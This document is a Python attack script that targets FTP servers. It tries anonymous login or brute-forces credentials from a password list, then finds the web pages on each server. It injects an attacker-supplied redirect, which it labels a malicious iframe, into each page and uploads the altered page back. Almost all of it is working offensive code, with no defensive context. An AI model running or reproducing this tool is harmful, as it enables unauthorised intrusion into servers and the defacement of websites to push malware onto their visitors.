#!/usr/bin/python
# -*- coding:utf-8 -*-
import ftplib
import optparse
import time


def anon_login(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'me@your.com')
        print('\n[*] ' + str(hostname) + ' FTP Anonymous Logon Succeeded.')
        ftp.quit()
        return True
    except Exception as e:
        print('\n[-] ' + str(hostname) + ' FTP Anonymous Logon Failed.')
        return False


def brute_login(hostname, password_file):
    with open(password_file, 'r') as pf:
        for line in pf.readlines():
            time.sleep(1)
            user_name = line.split(':')[0]
            password = line.split(':')[1]
            print("[+] Trying: " + user_name + "/" + password)
            try:
                ftp = ftplib.FTP(hostname)
                ftp.login(user_name, password)
                print('\n[*] ' + str(hostname) + ' FTP Logon Succeeded: ' + user_name + '/' + password)
                ftp.quit()
                return user_name, password
            except Exception as e:
                pass
        print('\n[-] Could not brute force FTP credentials.')
        return None, None


def return_default(ftp):
    try:
        dir_list = ftp.nlst()
    except:
        dir_list = []
        print('[-] Could not list directory contents.')
        print('[-] Skipping To Next Target.')
        return
    ret_list = []
    for filename in dir_list:
        fn = filename.lower()
        if '.php' in fn or '.htm' in fn or '.asp' in fn or '.html' in fn:
            print('[+] Found default page: ' + filename)
            ret_list.append(filename)
    return ret_list


def inject_page(ftp, page, redirect):
    with open(page + '.tmp', 'w') as f:
        ftp.retrlines('RETR ' + page, f.write)
        print('[+] Download Page: ' + page)
        f.write(redirect)
        f.close()
        print('[+] Injected Malicious IFrame on: ' + page)
        ftp.retrlines('STOR ' + page, open(page + '.tmp'))
        print('[+] Uploaded Injected Page: ' + page)


def attack(username, password, tgt_host, redirect):
    ftp = ftplib.FTP(tgt_host)
    ftp.login(username, password)
    def_pages = return_default(ftp)
    for def_page in def_pages:
        inject_page(ftp, def_page, redirect)


def main():
    parser = optparse.OptionParser('usage%prog -H <target host[s]> -r <redirect page> [-f <userpass file>]')
    parser.add_option('-H', dest='tgt_hosts', type='string', help='specify target host')
    parser.add_option('-f', dest='passwd_file', type='string', help='specify user/password file')
    parser.add_option('-r', dest='redirect', type='string', help='specify a redirection page')
    (options, args) = parser.parse_args()
    tgt_hosts = str(options.tgt_hosts).split(',')
    passwd_file = options.passwd_file
    redirect = options.redirect
    if tgt_hosts is None or redirect is None:
        print(parser.usage)
        exit(0)
    for tgt_host in tgt_hosts:
        username = None
        password = None
        if anon_login(tgt_host):
            username = 'anonymous'
            password = 'me@your.com'
            print('[+] Using Anonymous Creds to attack')
            attack(username, password, tgt_host, redirect)
        elif passwd_file is not None:
            username, password = brute_login(tgt_host, passwd_file)
        if password is not None:
            print('[+] Using Creds: ' + username + '/' + password + ' to attack')
            attack(username, password, tgt_host, redirect)


if __name__ == '__main__':
    main()
